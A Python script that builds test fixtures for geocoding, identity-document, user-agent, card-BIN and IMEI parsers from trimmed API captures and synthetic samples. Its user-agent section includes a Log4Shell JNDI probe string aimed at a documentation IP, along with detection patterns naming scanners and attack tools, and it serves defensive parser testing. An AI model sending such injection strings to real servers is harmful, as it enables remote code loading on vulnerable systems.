"""Rebuild ../fixtures from ../raw/live and the research samples (run with python3 -I).

usage: cd code && python3 -I build_fixtures.py

Every fixture is minimised (only the fields the parsers use, a few records) and carries its
provenance: envelope fixtures are {"_envelope": 1, "_source"|"_synthetic", "status", "headers",
"body"}; text fixtures are raw bodies (synthetic ones start with a '#' comment line when the
format allows it). Untrusted downloads are only read as bytes/JSON here - never executed.
The image_ela fixtures come from make_ela_fixtures.py (Pillow, synthetic images).

Scrubbing: the live geocoding captures are public landmarks / a public organisation's office
(Marco Zero and Praça da Sé in São Paulo, NIC.br's building) - no private address. The binlist
captures are the provider's public documentation BIN. The P273 texts are synthetic: names are
placeholders (Fulano/Beltrana/Cicrano/Deltrano), CPFs are documentation values 000.000.00N-DV
with valid check digits. The PAN text uses public test card numbers only.
"""
import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))  # our own code dir only
import parsers as p  # noqa: E402

RAW = HERE.parent / "raw" / "live"
FIX = HERE.parent / "fixtures"
SAMPLES = HERE.parents[3] / "research" / "samples"
MANIFEST = []


def raw_body(name):
    return (RAW / (name + ".body")).read_bytes()


def raw_meta(name):
    return json.loads((RAW / (name + ".meta.json")).read_text())


def keep_headers(meta, names=("content-type", "retry-after", "server", "cache-control", "x-cache")):
    last = (meta.get("responses") or [{}])[-1].get("headers", {})
    return {k: v for k, v in last.items() if k in names}


def sample(name):
    return json.loads((SAMPLES / name).read_bytes())


def write(name, data, module, case, provenance, source, note=""):
    path = FIX / name
    if isinstance(data, (dict, list)):
        text = json.dumps(data, indent=1, ensure_ascii=False) + "\n"
        path.write_text(text, encoding="utf-8")
    elif isinstance(data, str):
        path.write_text(data, encoding="utf-8")
    else:
        path.write_bytes(data)
    MANIFEST.append({"file": name, "module": module, "case": case, "provenance": provenance,
                     "source": source, "note": note, "bytes": path.stat().st_size})


def env(status, headers, body, source=None, synthetic=None):
    out = {"_envelope": 1}
    if source:
        out["_source"] = source
    if synthetic:
        out["_synthetic"] = synthetic
    out.update({"status": status, "headers": headers, "body": body})
    return out


def live_src(name):
    m = raw_meta(name)
    return "GET %s (%s, generic client UA, datacenter egress)" % (m["url"], m["started_utc"])


# ----------------------------------------------------------------------------- geocoding (P262)

NOM_KEEP = ("licence", "osm_type", "osm_id", "lat", "lon", "category", "type", "place_rank",
            "addresstype", "name", "display_name", "address", "boundingbox")


def trim_nominatim(obj):
    return {k: obj[k] for k in NOM_KEEP if k in obj}


def build_geocoding():
    s = sample("nominatim_search.json")
    write("geocoding__nominatim_search_ok.json",
          env(200, {"content-type": "application/json; charset=utf-8"}, [trim_nominatim(x) for x in s[:1]],
              source="research sample nominatim_search.json (GET /search?q=Praça da Sé São Paulo&format=jsonv2&limit=1, "
                     "2026-11-25, V3LUM/0.1 UA): place_id/importance dropped"),
          "geocoding", "ok", "research", "samples/nominatim_search.json", "public square, rank 24 -> city precision")
    name = "nom_reverse_marco_zero"
    write("geocoding__nominatim_reverse_ok.json",
          env(200, keep_headers(raw_meta(name)), trim_nominatim(json.loads(raw_body(name))),
              source=live_src(name) + "; place_id/importance dropped"),
          "geocoding", "ok_reverse", "live", live_src(name), "public monument (Marco Zero SP), addressdetails=1, zoom=18")
    write("geocoding__nominatim_search_empty.json",
          env(200, {"content-type": "application/json; charset=utf-8"}, [],
              synthetic="documented Nominatim /search answer for no match (an empty JSON array); the live "
                        "search attempts of this prep were refused with HTTP 629 at the CDN edge"),
          "geocoding", "empty", "synthetic", "Nominatim API docs (search: [] when nothing matches)")
    write("geocoding__nominatim_reverse_not_found.json",
          env(200, {"content-type": "application/json; charset=utf-8"}, {"error": "Unable to geocode"},
              synthetic="documented Nominatim /reverse answer when no OSM object is near the point "
                        "(e.g. open sea); not observed live in this prep"),
          "geocoding", "not_found", "synthetic", "Nominatim API docs (reverse: {'error': 'Unable to geocode'})")
    for raw_name, case, status, fname, note in (
            ("osmgit_nominatim_403_html", "blocked", 403, "geocoding__nominatim_blocked_403.json",
             "the page nominatim.openstreetmap.org serves for 403/418 (nginx error_page /403.html)"),
            ("osmgit_nominatim_509_html", "rate_limited", 429, "geocoding__nominatim_rate_limited_509.json",
             "the page served for 429/503 (nginx error_page /509.html); status kept as 429")):
        body = raw_body(raw_name).decode("latin-1")
        write(fname, env(status, {"content-type": "text/html"}, body,
                         source="OSMF chef cookbook nominatim/files/default/website/%s (%s); %s" % (
                             raw_name.split("_")[-2] + ".html", raw_meta(raw_name)["started_utc"], note)),
              "geocoding", case, "live", raw_meta(raw_name)["url"], note)
    name = "nom_search_street"
    write("geocoding__nominatim_rate_limited_629.json",
          env(629, keep_headers(raw_meta(name)), raw_body(name).decode("utf-8"),
              source=live_src(name) + "; CDN (Varnish) edge refusal: 4 of 5 requests (all 3 /search attempts and "
                                      "/reverse at 0,0) with a generic UA without contact e-mail, while /reverse at "
                                      "Marco Zero answered 200 between them"),
          "geocoding", "rate_limited_edge", "live", live_src(name), "HTTP 629 'Unknown Error', Retry-After: 0")

    name = "photon_search_addr"
    obj = json.loads(raw_body(name))
    obj = {"type": obj["type"], "features": obj["features"][:3]}
    for f in obj["features"]:
        f["properties"].pop("extent", None)
    write("geocoding__photon_search_ok.json", env(200, keep_headers(raw_meta(name)), obj, source=live_src(name)
                                                  + "; first 3 of 5 features (two share osm_id: office + shop tags)"),
          "geocoding", "ok", "live", live_src(name), "NIC.br building (public organisation), dedup by osm_id")
    for name, fname, case, note in (
            ("photon_search_cep", "geocoding__photon_search_cep_ok.json", "ok_cep", "postcode place, [lon, lat]"),
            ("photon_reverse_marco_zero", "geocoding__photon_reverse_ok.json", "ok_reverse", "public monument"),
            ("photon_search_empty", "geocoding__photon_search_empty.json", "empty", "random token query"),
            ("photon_reverse_bad", "geocoding__photon_error_400.json", "error", "lat=999 validation error")):
        m = raw_meta(name)
        write(fname, env(m["http_code"], keep_headers(m), json.loads(raw_body(name)), source=live_src(name)),
              "geocoding", case, "live", live_src(name), note)


# ----------------------------------------------------------------------- P273 synthetic texts

GAZETTE_PARAGRAPH = """# synthetic test text (P273-FC6) - names are placeholders, CPFs are documentation values
DIÁRIO OFICIAL - EDITAL Nº 12/2026 - HOMOLOGAÇÃO DO RESULTADO FINAL
A Comissão torna pública a homologação dos candidatos aprovados: FULANO DE TAL SOUZA, CPF 000.000.001-91, \
Campinas/SP; BELTRANA DA SILVA, CPF 000.000.002-72, Santos/SP; CICRANO PEREIRA LIMA, CPF 000.000.003-53, \
Sorocaba/SP; DELTRANO COSTA, Ribeirão Preto/SP; ERNESTA ALVES, CPF 000.000.004-34, Bauru/SP.
"""

GAZETTE_TABLE = """# synthetic test text (P273-FC6) - CSV with ';' fields, one record per line
Classificação;Nome;CPF;Município
1;FULANO DE TAL SOUZA;000.000.001-91;Campinas
2;BELTRANA DA SILVA;000.000.002-72;Santos
3;DELTRANO COSTA;;Ribeirão Preto
4;CICRANO PEREIRA LIMA;000.000.003-53;Sorocaba
"""

NO_CPF = """# synthetic test text (P273-FC6) - the subject has no CPF nearby
ATA DA REUNIÃO ORDINÁRIA
Presentes: DELTRANO COSTA, representante da área de compras, e demais membros da comissão.
""" + ("Texto de preenchimento sem dados pessoais. " * 8) + """
Assina como testemunha BELTRANA DA SILVA, CPF 000.000.002-72.
"""

MASKED_LIST = """# synthetic test text (P273-FC6) - LGPD-style masked CPFs
RESULTADO PRELIMINAR: FULANO DE TAL SOUZA (CPF ***.000.001-**); BELTRANA DA SILVA (CPF ***.000.002-**); \
CICRANO PEREIRA LIMA (CPF ***.000.003-**).
"""

CONTRACT_FORM = """# synthetic test text (P273-FC6) - qualification block with 'CPF:' on its own line
CONTRATANTE
Nome: FULANO DE TAL SOUZA
CPF: 000.000.001-91
Cidade: Campinas - SP

CONTRATADA
Razão social: EMPRESA EXEMPLO LTDA
CNPJ: 00.000.000/0001-91
"""


def build_identity_texts():
    for fname, text, case in (
            ("document_identity_signals__gazette_paragraph.txt", GAZETTE_PARAGRAPH, "ok_prose"),
            ("document_identity_signals__gazette_table.txt", GAZETTE_TABLE, "ok_lines"),
            ("document_identity_signals__no_cpf.txt", NO_CPF, "not_found_cpf"),
            ("document_identity_signals__masked_list.txt", MASKED_LIST, "ok_masked"),
            ("document_identity_signals__contract_form.txt", CONTRACT_FORM, "ok_form")):
        write(fname, text, "document_identity_signals", case, "synthetic", "written for P273-FC6")


# ---------------------------------------------------------------------- user_agent_analysis (P317)

TELER_KEEP = [" YLT", "^FDM ", "^Expanse", "^Nuclei", "censys", "curl", "facebookexternalhit",
              "Go-http-client", "l9explore", "masscan\\/", "Microsoft Office", "Nikto", "python-requests",
              "Scrapy", "sqlmap", "WhatsApp", "zgrab", "\\$\\{jndi:",
              "[a-z0-9\\-_]*(bot|crawl|headless|archiver|transcoder|spider|uptime|validator|fetcher|checker|"
              "reader|extractor|monitoring|analyzer|scraper)"]

SYNTHETIC_UAS = [
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "category": "browser", "browser": "Chrome", "os": "Windows", "device": "desktop"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
     "category": "browser", "browser": "Edge", "os": "Windows", "device": "desktop"},
    {"ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
     "category": "browser", "browser": "Safari", "os": "iOS", "device": "mobile"},
    {"ua": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/26.0 Chrome/122.0.0.0 Mobile Safari/537.36",
     "category": "browser", "browser": "Samsung Internet", "os": "Android", "device": "mobile"},
    {"ua": "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
     "category": "browser", "browser": "Firefox", "os": "Linux", "device": "desktop"},
    {"ua": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     "category": "bot", "tool": "Googlebot", "device": "bot"},
    {"ua": "WhatsApp/2.24.25.78 A", "category": "bot", "tool": "WhatsApp link preview", "device": "bot"},
    {"ua": "curl/8.5.0", "category": "automation", "tool": "curl", "device": "bot"},
    {"ua": "sqlmap/1.8.11#stable (https://sqlmap.org)", "category": "scanner", "tool": "sqlmap"},
    {"ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
     "category": "scanner", "tool": "Nuclei"},
    {"ua": "masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "category": "scanner", "tool": "masscan"},
    {"ua": "Mozilla/5.0 zgrab/0.x", "category": "scanner", "tool": "ZGrab"},
    {"ua": "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
     "category": "benign_scanner", "tool": "Censys"},
    {"ua": "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day",
     "category": "benign_scanner", "tool": "Palo Alto Cortex Xpanse"},
    {"ua": "${jndi:ldap://198.51.100.7:1389/a}", "category": "scanner", "tool": "Log4Shell probe",
     "exploit_probe": "log4shell_jndi"},
    {"ua": "", "category": "empty"},
    {"ua": "Mozilla/5.0 (compatible; " + "a" * 2000 + ")", "category": "unknown", "truncated": True,
     "note": "pathological ReDoS candidate: > 1 KB, truncated before matching"},
]


def build_user_agent():
    name = "teler_bad_crawlers"
    lines = raw_body(name).decode("utf-8").split("\n")
    kept = [ln for ln in lines if ln in TELER_KEEP]
    missing = sorted(set(TELER_KEEP) - set(kept))
    if missing:
        raise SystemExit("teler lines not found: %r" % missing)
    write("user_agent_analysis__teler_bad_crawlers_ok.txt", "\n".join(kept) + "\n", "user_agent_analysis", "ok",
          "live", live_src(name), "%d of %d lines kept verbatim (leading/trailing spaces are significant)"
          % (len(kept), len([ln for ln in lines if ln.strip()])))
    name = "teler_not_found"
    m = raw_meta(name)
    write("user_agent_analysis__teler_not_found_404.json",
          env(404, keep_headers(m), raw_body(name).decode("utf-8"), source=live_src(name)),
          "user_agent_analysis", "not_found", "live", live_src(name), "raw.githubusercontent.com 404 text body")
    cwa = sample("teler_common_web_attacks.json")
    cwa = {"filters": cwa["filters"][:2]}
    write("user_agent_analysis__teler_common_web_attacks.json", cwa, "user_agent_analysis", "phpids_guard",
          "research", "samples/teler_common_web_attacks.json (first 2 of 76 PHPIDS filters, LGPL-3.0)",
          "must be rejected as UA patterns (P317-FC2); never bundled in V3LUM")
    write("user_agent_analysis__synthetic_uas.json",
          {"_synthetic": "UA strings written for P317-FC5 (browser, bots, scanners, research scanners, a "
                         "Log4Shell probe with a documentation IP, empty, and a > 1 KB ReDoS candidate)",
           "uas": SYNTHETIC_UAS},
          "user_agent_analysis", "synthetic", "synthetic", "written for P317-FC5")


# ---------------------------------------------------------------------------------- card_bin (P318)

PAN_TEXT = """# synthetic test text (P318-FC1) - public test card numbers only
Pedido 2026-11-26: cartão 4111 1111 1111 1111 validade 12/30; reserva 5555-5555-5555-4444.
Amex de teste 378282246310005. Elo de teste 6362970000457013.
Não são cartões: CNPJ 00.000.000/0001-91, telefone +55 11 5555-0123, protocolo 1234567890123 (Luhn inválido),
valor 1.234.567.890.123,45.
"""


def build_card_bin():
    name = "binlist_docs_bin"
    body = json.loads(raw_body(name))
    body["country"] = {k: v for k, v in body["country"].items() if k not in ("emoji", "latitude", "longitude")}
    write("card_bin__binlist_ok.json",
          env(200, keep_headers(raw_meta(name)), body,
              source=live_src(name) + " with Accept-Version: 3 (binlist documentation BIN); flag emoji and "
                                      "country centroid dropped"),
          "card_bin", "ok", "live", live_src(name), "public documentation BIN 45717360 (Jyske Bank, DK)")
    name = "binlist_404_probe"
    write("card_bin__binlist_empty_in_200.json",
          env(200, keep_headers(raw_meta(name)), json.loads(raw_body(name)),
              source=live_src(name) + " with Accept-Version: 3: HTTP 200 with every field empty"),
          "card_bin", "empty_in_200", "live", live_src(name), "no issuer data -> absent, never 'unknown BIN'")
    name = "binlist_unknown_bin"
    write("card_bin__binlist_invalid_400.json",
          env(400, keep_headers(raw_meta(name)), "", source=live_src(name) + " with Accept-Version: 3: empty body"),
          "card_bin", "error", "live", live_src(name), "BIN 000000 rejected with HTTP 400 and no body")
    write("card_bin__binlist_not_found_404.json",
          env(404, {"server": "cloudflare"}, "",
              synthetic="binlist.net docs: 'If no matching cards are found an HTTP 404 response is returned' "
                        "(body not documented; not observed live - BIN 100000 gave HTTP 200 with empty fields)"),
          "card_bin", "not_found", "synthetic", "binlist.net home page documentation")
    write("card_bin__binlist_rate_limited_429.json",
          env(429, {"server": "cloudflare"}, "",
              synthetic="binlist.net docs: 'Requests are throttled at 5 per hour with a burst allowance of 5 "
                        "... the service will return a 429 http status code' (body not documented; not provoked "
                        "on purpose)"),
          "card_bin", "rate_limited", "synthetic", "binlist.net home page documentation")
    write("card_bin__binlist_challenge_403.json",
          env(403, {"server": "cloudflare", "content-type": "text/html; charset=UTF-8", "cf-mitigated": "challenge"},
              "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title></head>"
              "<body><noscript>Enable JavaScript and cookies to continue</noscript></body></html>",
              synthetic="generic Cloudflare managed-challenge page shape (lookup.binlist.net is behind "
                        "Cloudflare); not observed for binlist in this prep"),
          "card_bin", "blocked", "synthetic", "Cloudflare challenge page shape")
    write("card_bin__pan_text_synthetic.txt", PAN_TEXT, "card_bin", "pan_minimisation", "synthetic",
          "public test PANs (Visa 4111..., MC 5555...4444, Amex 378282246310005, Elo test number)")


# ------------------------------------------------------------------------------- imei_check (P319)

def build_imei():
    name = "imeidb_api_no_token"
    m = raw_meta(name)
    write("imei_check__imeidb_needs_key_401.json",
          env(401, keep_headers(m), json.loads(raw_body(name)),
              source=live_src(name) + ": TAC probe of the docs example TAC 35389310 (serial 000000 + Luhn), "
                                      "no token"),
          "imei_check", "needs_key", "live", live_src(name), "HTTP 401 + JSON code 401")
    probe = p.imei_tac_probe("35389310")
    ok = {"success": True, "query": int(probe), "data": {
        "tac": 35389310, "serial": 0, "controlNumber": int(probe[-1]), "valid": True, "device_id": 9846,
        "device_spec": {"sim_slots": 1, "os": "iOS 13", "os_family": "iOS", "aliases": ["A2218", "A2161", "A2220"],
                        "nettech": ["GSM", "CDMA", "HSPA", "EVDO", "LTE"]},
        "name": "Apple iPhone 11 Pro Max", "brand": "Apple", "model": "iPhone 11 Pro Max",
        "models": ["iPhone 11 Pro Max"], "manufacturer": "Apple Inc", "type": "Smartphone",
        "blacklist": {"status": False}}}
    write("imei_check__imeidb_ok_docs_synthetic.json",
          env(200, {"content-type": "application/json; charset=UTF-8"}, ok,
              synthetic="response example of https://imeidb.xyz/api (fetched 2026-11-26) re-keyed to the TAC "
                        "probe %s (serial 0); device_image, bluetooth/usb/wlan/speed and frequency dropped. "
                        "NOT a real token capture: P319-FC5 still needs one" % probe),
          "imei_check", "ok", "synthetic", "imeidb.xyz API documentation example")
    for status, msg, case in ((402, "Out of money, please top up your balance.", "quota"),
                              (429, "Rate limit exceeded.", "rate_limited"),
                              (460, "Invalid IMEI", "error")):
        write("imei_check__imeidb_%s_%d.json" % (case, status),
              env(status, {"content-type": "application/json; charset=UTF-8"},
                  {"success": False, "message": msg, "code": status},
                  synthetic="imeidb.xyz API docs error table (code %d '%s'), body shaped like the live 401" % (status, msg)),
              "imei_check", case, "synthetic", "imeidb.xyz API documentation error table")
    write("imei_check__imeidb_html_in_200.json",
          env(200, {"content-type": "text/html; charset=UTF-8"},
              "<!DOCTYPE html><html><head><title>Mobile IMEI Decoder and Lookup</title></head><body>...</body></html>",
              synthetic="trimmed head of the real imeidb.xyz home page (2026-11-26) standing for an HTML answer "
                        "where JSON is expected"),
          "imei_check", "error_in_200", "synthetic", "imeidb.xyz home page title")


def main():
    FIX.mkdir(exist_ok=True)
    keep = {pth.name for pth in FIX.glob("image_ela__*")}
    for pth in FIX.iterdir():
        if pth.name not in keep and pth.name != "MANIFEST.json":
            pth.unlink()
    build_geocoding()
    build_identity_texts()
    build_user_agent()
    build_card_bin()
    build_imei()
    man_path = FIX / "MANIFEST.json"
    old = json.loads(man_path.read_text()) if man_path.exists() else {}
    ela = [e for e in old.get("fixtures", []) if e.get("module") == "image_ela"]
    data = {"generated_by": "code/build_fixtures.py (+ code/make_ela_fixtures.py for image_ela)",
            "fixtures": sorted(MANIFEST + ela, key=lambda e: e["file"])}
    man_path.write_text(json.dumps(data, indent=1, ensure_ascii=False) + "\n", encoding="utf-8")
    print("wrote %d fixtures (+%d image_ela)" % (len(MANIFEST), len(ela)))


if __name__ == "__main__":
    main()
